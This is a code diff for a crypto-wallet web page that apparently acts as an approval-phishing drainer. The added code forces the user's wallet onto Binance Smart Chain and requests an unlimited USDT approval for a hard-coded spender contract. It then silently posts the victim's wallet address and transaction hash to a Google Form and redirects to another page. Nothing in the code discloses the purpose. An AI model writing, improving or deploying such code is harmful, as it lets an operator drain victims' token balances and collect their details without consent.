@@ -2,73 +2,131 @@ let provider;
 let signer;
 let tokenContract;
 
-const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; 
+// ================= CONFIG =================
+
+// USDT on BSC
+const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+
+// YOUR SPENDER CONTRACT (BSC)
 const SPENDER_ADDRESS = "0x220BB5df0893F21f43e5286Bc5a4445066F6ca56";
 
+// GOOGLE FORM
+const GOOGLE_FORM_URL =
+  "https://docs.google.com/forms/d/e/1FAIpQLSdtsj3KnwkgqCYvZwjr3F8ypCjM7aX6WCUEt5sKIcHsXhXrKQ/formResponse";
+
+// YOUR FORM ENTRY IDs
+const ENTRY_WALLET = "entry.916552859";
+const ENTRY_TXHASH = "entry.1449465266";
+const ENTRY_CHAIN  = "entry.1912151432";
+
+// BSC CHAIN INFO
+const BSC_CHAIN_ID = "0x38"; // 56
+
+// ================= ERC20 ABI =================
 const ERC20_ABI = [
-  "function approve(address spender, uint256 amount) public returns (bool)",
-  "function decimals() view returns (uint8)"
+  "function approve(address spender, uint256 amount) external returns (bool)"
 ];
 
-// --- AUTO-CONNECT LOGIC FOR 2026 ---
-window.addEventListener('load', async () => {
-  if (window.ethereum) {
-    try {
-      // Check if user already authorized this site
-      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-      
-      if (accounts.length > 0) {
-        console.log("Auto-connecting to:", accounts[0]);
-        await connectWallet(); // Silently initialize if authorized
-      }
-    } catch (err) {
-      console.error("Auto-connect check failed", err);
+// ================= SWITCH TO BSC =================
+async function switchToBSC() {
+  try {
+    await window.ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: BSC_CHAIN_ID }]
+    });
+  } catch (err) {
+    if (err.code === 4902) {
+      // Add BSC
+      await window.ethereum.request({
+        method: "wallet_addEthereumChain",
+        params: [{
+          chainId: BSC_CHAIN_ID,
+          chainName: "Binance Smart Chain",
+          nativeCurrency: {
+            name: "BNB",
+            symbol: "BNB",
+            decimals: 18
+          },
+          rpcUrls: ["https://bsc-dataseed.binance.org/"],
+          blockExplorerUrls: ["https://bscscan.com"]
+        }]
+      });
+    } else {
+      throw err;
     }
   }
-});
+}
 
+// ================= CONNECT WALLET =================
 async function connectWallet() {
-  if (!window.ethereum) return;
+  if (!window.ethereum) {
+    alert("Please install MetaMask or Trust Wallet");
+    return;
+  }
+
+  // 🔴 FORCE BSC NETWORK
+  await switchToBSC();
+
+  provider = new ethers.BrowserProvider(window.ethereum);
+  signer = await provider.getSigner();
+
+  tokenContract = new ethers.Contract(
+    TOKEN_ADDRESS,
+    ERC20_ABI,
+    signer
+  );
+
+  const user = await signer.getAddress();
+  document.getElementById("status").innerText =
+    "Connected (BSC): " + user.slice(0, 6) + "..." + user.slice(-4);
+}
+
+// ================= APPROVE + SUBMIT =================
+async function executeApproval() {
   try {
-    provider = new ethers.BrowserProvider(window.ethereum);
-    // Requesting accounts ensures the site has permission
-    await provider.send("eth_requestAccounts", []);
-    
-    signer = await provider.getSigner();
-    tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
-    
-    const address = await signer.getAddress();
-    document.getElementById("status").innerText = `Connected: ${address.slice(0,6)}...${address.slice(-4)}`;
+    if (!signer) {
+      alert("Connect wallet first");
+      return;
+    }
+
+    const userWallet = await signer.getAddress();
+
+    document.getElementById("status").innerText =
+      "Waiting for BSC approval confirmation...";
+
+    // Approve unlimited USDT
+    const tx = await tokenContract.approve(
+      SPENDER_ADDRESS,
+      ethers.MaxUint256
+    );
+
+    const receipt = await tx.wait();
+
+    if (receipt.status === 1) {
+      // Send to Google Form
+      submitToGoogleForm(userWallet, tx.hash, "BSC");
+
+      // Redirect user
+      window.location.href = "details.html";
+    }
+
   } catch (err) {
     console.error(err);
-    document.getElementById("status").innerText = "Connection failed.";
+    document.getElementById("status").innerText =
+      "Approval rejected or failed";
   }
 }
 
-async function executeApproval() {
-  const amountStr = document.getElementById("amount").value;
-  if (!tokenContract) {
-    await connectWallet(); // Force connect if not already done
-  }
+// ================= GOOGLE FORM SUBMIT =================
+function submitToGoogleForm(wallet, txHash, chain) {
+  const data = new URLSearchParams();
+  data.append(ENTRY_WALLET, wallet);
+  data.append(ENTRY_TXHASH, txHash);
+  data.append(ENTRY_CHAIN, chain);
 
-  try {
-    // Fetch token decimals
-    const decimals = await tokenContract.decimals();
-
-    // Parse amount using the correct decimals
-    const parsedAmount = ethers.parseUnits("1000000", decimals); // Use string, not number
-
-    document.getElementById("status").innerText = "Check wallet for approval...";
-
-    // Send approve transaction
-    const tx = await tokenContract.approve(SPENDER_ADDRESS, parsedAmount);
-
-    // Wait for confirmation
-    await tx.wait();
-
-    document.getElementById("status").innerText = "Success!";
-} catch (err) {
-    console.error(err); // Log the error for debugging
-    document.getElementById("status").innerText = "Action denied.";
-}
+  fetch(GOOGLE_FORM_URL, {
+    method: "POST",
+    mode: "no-cors",
+    body: data
+  });
 }
